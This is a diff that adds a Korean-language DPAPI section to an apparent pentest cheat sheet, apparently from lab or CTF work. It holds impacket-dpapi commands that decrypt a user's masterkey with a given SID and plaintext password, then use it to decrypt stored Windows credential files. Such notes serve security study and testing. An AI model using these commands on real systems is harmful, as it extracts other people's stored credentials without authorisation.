@@ -652,3 +652,24 @@ sqlcmd -q 'SELECT table_name from adsync.information_schema.tables';
 ```
  
 </details>
+
+---
+<details>
+ <summary><strong>DPAPI</strong></summary>
+
+## DPAPI란?
+- Windows에서 제공하는 암호화 API로, 사용자 또는 시스템 수준에서 민감한 데이터를 보호합니다.
+- `WINRM`으로 다운로드시에 숨김파일로 인해서 다운로드 불가능할 수 있음.
+
+## masterkey 복호화
+```bash
+impacket-dpapi masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
+```
+
+## Credential files 복호화
+```bash
+# 복호화된 마스터키를 가지고 자격 증명 파일 복호화
+impacket-dpapi credential -file <credential file> -key <복호화된 master key>
+```
+ 
+</details>
